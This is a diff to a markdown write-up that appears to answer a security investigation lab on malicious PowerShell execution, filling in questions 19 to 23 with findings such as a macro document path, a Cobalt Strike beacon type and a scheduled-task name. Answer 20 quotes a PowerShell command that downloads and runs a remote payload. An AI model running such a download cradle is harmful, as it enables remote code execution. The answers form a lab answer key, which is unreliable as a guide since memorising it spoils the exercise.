@@ -507,27 +507,27 @@ Malicious Powershell Script Execution:
 ![image](https://github.com/user-attachments/assets/5ff1ff50-199a-4f29-98b3-1d090b3cc58b)
 
 
-> 19TH QUESTION --> ANS:
+> 19TH QUESTION --> ANS: `C:\USERS\CEO-US\DOWNLOADS\POLICY.DOCM`
 
 ![image](https://github.com/user-attachments/assets/07ba599e-943b-4ebf-b682-ac31cf0f0623)
 
 
-> 20TH QUESTION --> ANS:
+> 20TH QUESTION --> ANS: `powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://192.168.1.5:806/a'))`
 
 ![image](https://github.com/user-attachments/assets/76c9edc4-6c82-41fe-9af1-1ad69081318a)
 
 
-> 21ST QUESTION --> ANS:
+> 21ST QUESTION --> ANS: `trojan.cobaltstrike/beacon`
 
 ![image](https://github.com/user-attachments/assets/22e67f89-e4fa-48e2-9511-96c105bc6efc)
 
 
-> 22ND QUESTION --> ANS:
+> 22ND QUESTION --> ANS: `windows-beacon_http-reverse_http`
 
 ![image](https://github.com/user-attachments/assets/a09f7537-4060-4c40-8680-8c4071229499)
 
 
-> 23RD QUESTION --> ANS:
+> 23RD QUESTION --> ANS: `WindowsUpdateCheck`
 
 ![image](https://github.com/user-attachments/assets/b360d8f3-01a6-433e-a51b-df1380e705bb)
 
